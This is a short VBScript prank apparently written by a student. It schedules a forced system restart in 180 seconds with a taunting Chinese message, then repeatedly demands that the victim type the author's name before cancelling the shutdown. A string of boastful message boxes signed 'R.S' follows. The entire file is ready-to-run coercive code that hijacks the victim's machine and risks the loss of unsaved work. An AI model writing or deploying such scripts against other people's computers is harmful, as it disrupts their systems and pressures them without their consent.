on error resume next
dim WSHshellA
set WSHshellA = wscript.createobject("wscript.shell")
WSHshellA.run "cmd.exe /c shutdown -r -t 180 -c ""我叫什么，不知道让你180秒关机，不信，试试···"" ",0 ,true
dim a
do while(a <> "任爽")
a = inputbox ("说我名字,就不关机，快，说　","说不说","不说",7000,8000)
msgbox chr(13) + chr(13) + chr(13) + a,5000,"MsgBox"
loop
msgbox chr(13) + chr(13) + chr(13) + "早叫说行了嘛"
dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.run "cmd.exe /c shutdown -a",0 ,true
msgbox chr(13) + chr(13) + chr(13) + "R.S"
msgbox chr(13) + chr(13) + chr(13) + "记住了,我是你的同学!"
msgbox chr(13) + chr(13) + chr(13) + "知道叫我什么了么?"
msgbox chr(13) + chr(13) + chr(13) + "可千万别忘了哦!"
msgbox chr(13) + chr(13) + chr(13) + "知道我是谁么?"
msgbox chr(13) + chr(13) + chr(13) + "记住了？"
msgbox chr(13) + chr(13) + chr(13) + "记住了么?~~~"
msgbox chr(13) + chr(13) + chr(13) + "R.S!"
msgbox chr(13) + chr(13) + chr(13) + "R.S!"
msgbox chr(13) + chr(13) + chr(13) + "88,!"